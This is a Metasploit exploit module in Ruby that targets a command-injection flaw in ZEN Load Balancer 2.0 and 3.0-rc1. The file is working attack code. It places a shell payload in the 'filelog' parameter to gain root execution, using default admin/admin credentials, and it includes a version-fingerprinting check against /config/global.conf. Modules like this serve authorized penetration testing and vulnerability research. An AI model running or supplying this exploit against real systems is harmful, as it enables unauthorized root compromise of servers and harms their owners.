##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ZEN Load Balancer Filelog Command Execution",
			'Description'    => %q{
				This module exploits a vulnerability in ZEN Load Balancer
				version 2.0 and 3.0-rc1 which could be abused to allow authenticated users
				to execute arbitrary code under the context of the 'root' user.
				The 'content2-2.cgi' file uses user controlled data from the 'filelog'
				parameter within backticks.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Brendan Coles <bcoles[at]gmail.com>' # Discovery and exploit
				],
			'References'     =>
				[
					['OSVDB', '85654'],
					['URL', 'http://itsecuritysolutions.org/2012-09-21-ZEN-Load-Balancer-v2.0-and-v3.0-rc1-multiple-vulnerabilities/']
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'none'
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'       => 1024,
					'BadChars'    => "\x00",
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic netcat-e perl bash',
						}
				},
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'Privileged'     => true,
			'DisclosureDate' => "Sep 14 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(444),
				OptBool.new('SSL', [true, 'Use SSL', true]),
				OptString.new('USERNAME', [true, 'The username for the application', 'admin']),
				OptString.new('PASSWORD', [true, 'The password for the application', 'admin'])
			], self.class)
	end

	def check

		@peer = "#{rhost}:#{rport}"

		# retrieve software version from config file
		print_status("#{@peer} - Sending check")
		begin
			res = send_request_cgi({
				'uri' => '/config/global.conf'
			})

			if    res and res.code == 200 and res.body =~ /#version ZEN\s+\$version=\"(2|3\.0\-rc1)/
				return Exploit::CheckCode::Appears
			elsif res and res.code == 200 and res.body =~ /zenloadbalancer/
				return Exploit::CheckCode::Detected
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
		end
		return Exploit::CheckCode::Unknown

	end

	def exploit

		@peer = "#{rhost}:#{rport}"
		user  = datastore['USERNAME']
		pass  = datastore['PASSWORD']
		auth  = Rex::Text.encode_base64("#{user}:#{pass}")
		cmd   = Rex::Text.uri_encode(";#{payload.encoded}&")
		lines = rand(100) + 1

		# send payload
		print_status("#{@peer} - Sending payload (#{payload.encoded.length} bytes)")
		begin
			res = send_request_cgi({
				'uri'     => "/index.cgi?nlines=#{lines}&action=See+logs&id=2-2&filelog=#{cmd}",
				'headers' =>
					{
						'Authorization' => "Basic #{auth}"
					}
			}, 25)
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, 'Connection failed')
		rescue
			fail_with(Exploit::Failure::Unknown, 'Sending payload failed')
		end

		if res and res.code == 401
			fail_with(Exploit::Failure::NoAccess, 'Authentication failed')
		end

	end

end
